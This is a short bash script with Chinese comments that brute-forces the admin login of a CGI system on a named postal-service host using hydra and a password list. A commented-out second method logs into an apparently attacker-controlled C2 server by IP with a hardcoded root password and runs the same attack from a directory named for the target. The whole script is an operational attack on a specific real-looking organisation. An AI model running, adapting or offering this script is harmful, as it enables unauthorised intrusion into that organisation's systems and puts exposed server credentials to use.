#!/bin/bash
# Hydra暴力破解MANGA系统
# 使用你的C2服务器执行

TARGET="vps.vnpost.vn"
PORT="443"
PATH="/cgi-bin/MANGA/index.cgi"

# 方法1：hydra
hydra -l admin -P final_password_list.txt \
  -s $PORT \
  $TARGET \
  https-post-form "$PATH:func=login&username=^USER^&password=^PASS^:errorMessage"

# 方法2：使用C2服务器并发
# sshpass -p '@admin1314@' ssh -p 2233 root@82.29.71.156 << 'REMOTE'
# cd /root/vnpost_attack
# hydra -l admin -P passwords.txt -t 10 -w 30 \
#   vps.vnpost.vn https-post-form \
#   "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:errorMessage"
# REMOTE
